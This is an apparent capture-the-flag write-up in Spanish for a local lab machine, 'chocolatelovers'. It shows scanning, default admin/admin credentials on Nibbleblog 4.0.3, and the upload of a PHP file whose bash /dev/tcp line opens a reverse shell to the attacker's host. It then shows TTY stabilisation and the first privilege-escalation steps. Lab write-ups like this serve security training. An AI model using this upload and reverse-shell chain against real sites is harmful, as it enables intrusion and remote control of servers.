### Maquina chocolatelovers

## Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

80/tcp open  http    syn-ack ttl 64

## Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p80 -vvv -Pn 172.17.0.2

![alt text](1.png)

## Entrando en la web

Al entrar en la web y haciendo ctrl + u podemos ver una ruta comentada llamada /nibbleblog

entramos: 

http://172.17.0.2/nibbleblog

utilizamos whatweb para ver las tecnologias que usa:

whatweb -a 3 http://172.17.0.2/nibbleblog
http://172.17.0.2/nibbleblog [301 Moved Permanently] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[172.17.0.2], RedirectLocation[http://172.17.0.2/nibbleblog/], Title[301 Moved Permanently]
http://172.17.0.2/nibbleblog/ [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[172.17.0.2], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[chocolate lovers - chocolate lovers]


y encontramos:

http://172.17.0.2/nibbleblog/admin.php


credenciales admin, admin


## FUZZING WEB

gobuster dir -t 200 -u http://172.17.0.2/nibbleblog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html -r -b 403,404 2>/dev/null



/content              (Status: 200) [Size: 1352]
/feed.php             (Status: 200) [Size: 1289]
/themes               (Status: 200) [Size: 1740]
/admin.php            (Status: 200) [Size: 1401]
/admin                (Status: 200) [Size: 2126]
/plugins              (Status: 200) [Size: 3776]
/index.php            (Status: 200) [Size: 3403]
/install.php          (Status: 200) [Size: 78]
/update.php           (Status: 200) [Size: 1792]
/README               (Status: 200) [Size: 4628]
/languages            (Status: 200) [Size: 3166]
/sitemap.php          (Status: 200) [Size: 541]
/LICENSE.txt          (Status: 200) [Size: 35148]
/COPYRIGHT.txt        (Status: 200) [Size: 1272]


En /README , encontramos:

====== Nibbleblog ======
Version: v4.0.3


## Intrusion

Creamos un archivo php malicioso:

lo llame rev-shell.php

<?php 
exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1' ");
?>


lo subimos como imagen dentro del plugin my_image

![alt text](image.png)


luego nos ponemos en escucha: nc -nlvp 443, para luego navegar a la siguient ruta

![alt text](image-1.png)


http://172.17.0.2/nibbleblog/content/private/plugins/my_image/image.php?cmd=id

![alt text](image-2.png)

acceso:

![alt text](image-3.png)

hacemos tratamiento de la tty
script /dev/null -c bash
ctrl + z
ctrl + z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash

luego ejecute el comando cat /etc/passwd | grep bash, para ver todos los usuarios y hay un usuario chocolate

![alt text](image-4.png)

luego ejecute sudo -l para escalar privilegios y me sale que puedo escalar a chocolate

![alt text](image-5.png)

ahora soy el usuario chocolate

## Escalar privilegios

hice el comando ps -faux

![alt text](image-6.png)

y vi que hay un /opt/script.php que se ejecuta cada cierto tiempo entonces le reemplace las lineas por las siguientes


![alt text](image-7.png)

![alt text](image-8.png)